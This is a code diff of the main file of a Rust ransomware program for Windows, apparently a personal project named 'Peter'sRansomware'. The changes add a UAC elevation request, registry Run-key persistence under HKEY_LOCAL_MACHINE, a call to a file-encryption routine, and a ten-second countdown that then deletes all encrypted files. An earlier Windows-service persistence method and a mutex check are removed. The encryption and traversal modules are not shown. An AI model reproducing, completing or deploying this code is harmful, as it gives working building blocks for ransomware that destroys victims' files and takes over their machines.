@@ -4,94 +4,170 @@ extern crate winapi;
 mod encryption;
 mod lib;
 mod traversing;
-use encryption::{decrypt, encrypt, generate_key};
+use lib::anti_reversing;
 use std::ffi::CString;
 use std::ptr::null_mut;
 use std::str;
 use traversing::{traverse_and_delete, traverse_and_encrypt};
+use winapi::shared::minwindef::HKEY;
 use winapi::um::errhandlingapi::GetLastError;
 use winapi::um::fileapi::{CreateFileA, OPEN_EXISTING};
 use winapi::um::handleapi::INVALID_HANDLE_VALUE;
 use winapi::um::libloaderapi::GetModuleFileNameA;
-use winapi::um::synchapi::CreateMutexA;
-use winapi::um::winbase::{GetUserNameA, OpenMutexA};
-use winapi::um::winnt::{HANDLE, SERVICE_AUTO_START, SERVICE_WIN32_OWN_PROCESS};
-use winapi::um::winsvc::{
-    CloseServiceHandle, CreateServiceA, OpenSCManagerA, StartServiceCtrlDispatcherA, SC_HANDLE,
-    SC_MANAGER_CREATE_SERVICE, SERVICE_CHANGE_CONFIG, SERVICE_TABLE_ENTRYA,
+use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
+use winapi::um::securitybaseapi::GetTokenInformation;
+use winapi::um::shellapi::ShellExecuteA;
+use winapi::um::synchapi::Sleep;
+use winapi::um::winbase::GetUserNameA;
+use winapi::um::winnt::{TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY};
+use winapi::um::winnt::{HANDLE, KEY_ALL_ACCESS, REG_SZ};
+use winapi::um::winreg::{
+    RegCloseKey, RegGetValueA, RegOpenKeyExA, RegSetValueExA, HKEY_LOCAL_MACHINE,
 };
 fn main() {
-    let service_table_entry: SERVICE_TABLE_ENTRYA = SERVICE_TABLE_ENTRYA {
-        lpServiceName: CString::new("ransomware").unwrap().as_ptr(),
-        lpServiceProc: Some(start_ransomware),
-    };
-    unsafe {
-        StartServiceCtrlDispatcherA(&service_table_entry);
-        start_ransomware(0, null_mut());
-    }
-}
-
-unsafe extern "system" fn start_ransomware(
-    dwNumServicesArgs: u32,
-    lpServiceArgVectors: *mut *mut i8,
-) {
-    let sc_manager: SC_HANDLE = OpenSCManagerA(
-        null_mut(), // connect to local computer manager
-        null_mut(), // SERVICES_ACTIVE_DATABASE default
-        SC_MANAGER_CREATE_SERVICE,
-    );
-
-    if sc_manager == null_mut() {
-        println!("Fail {}", GetLastError());
-        std::process::exit(0);
-    }
-    let mut name: Vec<i8> = Vec::new();
-    name.resize(200, 0i8);
-    let name_length = GetModuleFileNameA(null_mut(), name.as_mut_ptr(), 200);
-    let mut path_name: Vec<u8> = Vec::new();
-    for i in 0..name_length {
-        path_name.push(name[i as usize].clone() as u8);
-    }
-
-    CreateServiceA(
-        sc_manager,
-        CString::new("Peter'sRansomware").unwrap().as_ptr(),
-        CString::new("Peter'sRansomware").unwrap().as_ptr(),
-        SERVICE_CHANGE_CONFIG,
-        SERVICE_WIN32_OWN_PROCESS,
-        SERVICE_AUTO_START,
-        0,
-        CString::new(path_name).unwrap().as_ptr(),
-        null_mut(),
-        null_mut(),
-        null_mut(),
-        null_mut(),
-        null_mut(),
-    );
-
-    if check_mutex() {
-        // if a version of the code already running,exit
-        std::process::exit(0);
-    }
-    if already_encrypt() {
-        std::process::exit(0);
-    }
-    println!("fuck");
-    CloseServiceHandle(sc_manager);
-    // traverse_and_encrypt();
-}
-
-fn check_mutex() -> bool {
-    unsafe {
-        let mutex_handle: HANDLE =
-            OpenMutexA(0x1f0001, 0, CString::new("Peter114").unwrap().as_ptr());
-
-        if mutex_handle == null_mut() {
-            CreateMutexA(null_mut(), 0, CString::new("Peter114").unwrap().as_ptr());
-            return false;
+    if !already_encrypt() {
+        //anti_reversing();
+        if check_elevation() {
+            println!("Elevated!!! Yay");
         } else {
-            return true;
+            println!("Not elevated. Requesting UAC");
+            std::process::exit(0);
         }
+        if add_registry() == false {
+            // every other time after reboot
+            println!("Add registry fail");
+        } else {
+            // first time run
+            println!("Sucessfully generate registry");
+        }
+        traverse_and_encrypt();
+        std::process::exit(0);
+    }
+    println!("File is already encrypted :D. There is nothing you can do now....");
+
+    let mut total_time = 10000;
+    while total_time > 0 {
+        unsafe {
+            println!("You have {} seconds left", total_time / 1000);
+            Sleep(1000);
+            total_time -= 1000;
+        }
+    }
+    println!("Time's up!! Deleting all encrypted files");
+    traverse_and_delete();
+    loop {}
+}
+
+fn add_registry() -> bool {
+    unsafe {
+        let mut registry_handle: HKEY = null_mut();
+        if RegOpenKeyExA(
+            HKEY_LOCAL_MACHINE,
+            CString::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
+                .unwrap()
+                .as_ptr(),
+            0,
+            KEY_ALL_ACCESS,
+            &mut registry_handle,
+        ) != 0
+        {
+            println!("Fail to open registry key");
+            RegCloseKey(registry_handle);
+            return false;
+        }
+
+        let mut reg_type: u32 = 0;
+        let mut path: Vec<u8> = Vec::new();
+        let mut size: u32 = 200;
+        path.resize(200, 0u8);
+
+        if RegGetValueA(
+            HKEY_LOCAL_MACHINE,
+            CString::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
+                .unwrap()
+                .as_ptr(),
+            CString::new("Peter'sRansomware").unwrap().as_ptr(),
+            2,
+            &mut reg_type,
+            path.as_ptr() as *const _ as *mut _,
+            &mut size,
+        ) != 0
+        {
+            let mut name: Vec<i8> = Vec::new();
+            name.resize(200, 0i8);
+            let mut length = GetModuleFileNameA(null_mut(), name.as_ptr() as *mut i8, 200);
+            let mut path: Vec<u8> = Vec::new();
+            for i in 0..length as usize {
+                path.push(name[i].clone() as u8);
+            }
+            path.push(0u8);
+            length += 1;
+
+            if RegSetValueExA(
+                registry_handle,
+                CString::new("Peter'sRansomware").unwrap().as_ptr(),
+                0,
+                REG_SZ,
+                path.as_ptr(),
+                length,
+            ) != 0
+            {
+                println!("Fail to set registry key");
+                RegCloseKey(registry_handle);
+                return false;
+            } else {
+                RegCloseKey(registry_handle);
+                return true;
+            }
+        } else {
+            println!("Key already there, dont do anything");
+            RegCloseKey(registry_handle);
+            return false;
+        }
+    }
+}
+
+fn check_elevation() -> bool {
+    unsafe {
+        let mut name: Vec<i8> = Vec::new();
+        name.resize(200, 0i8);
+        let length = GetModuleFileNameA(null_mut(), name.as_ptr() as *mut i8, 200);
+        let mut path: Vec<u8> = Vec::new();
+        for i in 0..length as usize {
+            path.push(name[i].clone() as u8);
+        }
+        if is_elevated() {
+            return true;
+        } else {
+            println!("This is not elevated yet");
+            ShellExecuteA(
+                null_mut(),
+                CString::new("runas").unwrap().as_ptr(),
+                CString::from_vec_unchecked(path).as_ptr(),
+                null_mut(),
+                null_mut(),
+                1,
+            );
+        }
+        return false;
+    }
+}
+
+fn is_elevated() -> bool {
+    // https://vimalshekar.github.io/codesamples/Checking-If-Admin
+    let mut h_token: HANDLE = null_mut();
+    let mut token_ele: TOKEN_ELEVATION = TOKEN_ELEVATION { TokenIsElevated: 0 };
+    let mut size: u32 = 0u32;
+    unsafe {
+        OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut h_token);
+        GetTokenInformation(
+            h_token,
+            TokenElevation,
+            &mut token_ele as *const _ as *mut _,
+            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
+            &mut size,
+        );
+        return token_ele.TokenIsElevated == 1;
     }
 }
 
